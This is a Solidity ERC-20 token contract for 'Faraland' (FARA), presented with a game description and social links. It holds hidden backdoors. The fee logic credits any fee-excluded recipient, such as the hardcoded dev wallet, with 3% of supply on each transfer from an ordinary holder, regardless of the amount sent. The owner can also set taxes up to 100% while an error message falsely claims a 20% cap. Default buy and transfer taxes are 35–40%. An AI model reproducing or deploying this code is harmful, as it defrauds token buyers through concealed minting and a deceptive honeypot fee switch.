// SPDX-License-Identifier: MIT

/*

╋┏━┓╋╋╋╋╋╋╋┏┓╋╋╋╋╋╋╋╋┏┓
╋┃┏┛╋╋╋╋╋╋╋┃┃╋╋╋╋╋╋╋╋┃┃
┏┛┗┳━━┳━┳━━┫┃┏━━┳━┓┏━┛┃
┗┓┏┫┏┓┃┏┫┏┓┃┃┃┏┓┃┏┓┫┏┓┃
╋┃┃┃┏┓┃┃┃┏┓┃┗┫┏┓┃┃┃┃┗┛┃
╋┗┛┗┛┗┻┛┗┛┗┻━┻┛┗┻┛┗┻━━┛

PVE : Explore the Faraland world and the races living in the continent to find a way to seal the Demon Lord Beelzebul. In their journey, players must collect heroes from different races to overcome tough challenges. Each choice made during a quest can alter the storyline and expose your heroes to mysteries and hidden treasures.

PVP : Where the best heroes of Faraland compete against one another. A turn-based gameplay with unique and deep RPG (Role-playing game) elements, and a rich skill system that will never let you down. Showcase your tactical skills and game insight in this Arena!

Website: https://www.faralandgame.info
Telegram: https://t.me/faraland_eth
Twitter: https://twitter.com/faraland_eth
*/

pragma solidity 0.8.21;
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns (address uniPairV2);
}
contract FARA is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Faraland";
    string private constant _symbol = "FARA";
    uint8 private constant _decimals = 9;
    uint256 private _supply = 10 ** 9 * (10 ** _decimals);
    
    IUniswapV2Router uniRouterV2;
    address public uniPairV2;
    bool private tradingAllowed = false;
    bool private feeSwapAllowed = true;
    uint256 private swapCounter;
    bool private locked;
    uint256 feeSwapLimits;
    uint256 private maxFeeSwap = ( _supply * 1000 ) / 100000;
    uint256 private minFeeSwap = ( _supply * 10 ) / 100000;
    modifier lockSwap {locked = true; _; locked = false;}
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0;
    uint256 private devFee = 100;
    uint256 private burnTax = 0;
    uint256 private buyFees = 4000;
    uint256 private sellFees = 2500;
    uint256 private transferFees = 3500;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal devFeeReceiver = 0xe6e6327cDF51E44d79dd29F4881Aa60F237DF110; 
    address internal marketingFeeReceiver = 0xe6e6327cDF51E44d79dd29F4881Aa60F237DF110;
    address internal lpFeeReceiver = 0xe6e6327cDF51E44d79dd29F4881Aa60F237DF110;
    uint256 public _maxTxNum = ( _supply * 300 ) / 10000;
    uint256 public _maxTransferNum = ( _supply * 300 ) / 10000;
    uint256 public _maxWalletNum = ( _supply * 300 ) / 10000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFees;

    constructor() Ownable(msg.sender) {
        IUniswapV2Router _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
        uniRouterV2 = _router; uniPairV2 = _pair;
        isExcludedFromFees[marketingFeeReceiver] = true;
        isExcludedFromFees[devFeeReceiver] = true;
        isExcludedFromFees[msg.sender] = true;
        isExcludedFromFees[address(this)] = true;
        isExcludedFromFees[lpFeeReceiver] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function startTrading() external onlyOwner {tradingAllowed = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function feeSwapNeeded(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minFeeSwap;
        bool aboveThreshold = balanceOf(address(this)) >= maxFeeSwap;
        return !locked && feeSwapAllowed && tradingAllowed && aboveMin && !isExcludedFromFees[sender] && recipient == uniPairV2 && swapCounter >= feeSwapLimits && aboveThreshold;
    }
    function setFeeParameters(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnTax = _burn; devFee = _development; buyFees = _total; sellFees = _sell; transferFees = _trans;
        require(buyFees <= denominator.div(1) && sellFees <= denominator.div(1) && transferFees <= denominator.div(1), "buyFees and sellFees cannot be more than 20%");
    }
    function setTxAmounts(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        _maxTxNum = newTx; _maxTransferNum = newTransfer; _maxWalletNum = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterV2.WETH();
        _approve(address(this), address(uniRouterV2), tokenAmount);
        uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    function getFeeByAction(address sender, address recipient) internal view returns (uint256) {
        if(recipient == uniPairV2){return sellFees;}
        if(sender == uniPairV2){return buyFees;}
        return transferFees;
    }
    function getActualAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludedFromFees[recipient]) {return _maxTxNum;}
        if(getFeeByAction(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getFeeByAction(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnTax > uint256(0) && getFeeByAction(sender, recipient) > burnTax){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnTax));}
        return amount.sub(feeAmount);} return amount;
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludedFromFees[sender] && !isExcludedFromFees[recipient]){require(tradingAllowed, "tradingAllowed");}
        if(!isExcludedFromFees[sender] && !isExcludedFromFees[recipient] && recipient != address(uniPairV2) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletNum, "Exceeds maximum wallet amount.");}
        if(sender != uniPairV2){require(amount <= _maxTransferNum || isExcludedFromFees[sender] || isExcludedFromFees[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxNum || isExcludedFromFees[sender] || isExcludedFromFees[recipient], "TX Limit Exceeded"); 
        if(recipient == uniPairV2 && !isExcludedFromFees[sender]){swapCounter += uint256(1);}
        if(feeSwapNeeded(sender, recipient, amount)){triggerFeeSwap(maxFeeSwap); swapCounter = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludedFromFees[sender] ? getActualAmount(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function cleanDustTokens(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(devFeeReceiver, _amount);
    }
    function triggerFeeSwap(uint256 tokens) private lockSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(devFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketingFeeReceiver).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devFeeReceiver).transfer(contractBalance);}
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniRouterV2), tokenAmount);
        uniRouterV2.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpFeeReceiver,
            block.timestamp);
    }
}